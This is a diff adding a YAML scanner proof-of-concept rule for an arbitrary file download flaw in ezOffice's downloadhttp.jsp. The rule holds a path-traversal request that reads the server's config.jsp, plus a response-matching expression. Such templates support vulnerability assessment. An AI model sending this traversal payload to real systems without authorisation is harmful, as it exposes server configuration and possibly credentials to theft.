@@ -1,0 +1,13 @@
+name: poc-yaml-ezoffice-downloadhttp.jsp-filedownload
+rules:
+  - method: GET
+    path: /defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.headers["filename"].contains("../public/edit/jsp/config.jsp")
+
+detail:
+  author: PeiQi0
+  links:
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20downloadhttp.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md
+  tags: ezoffice,file,download
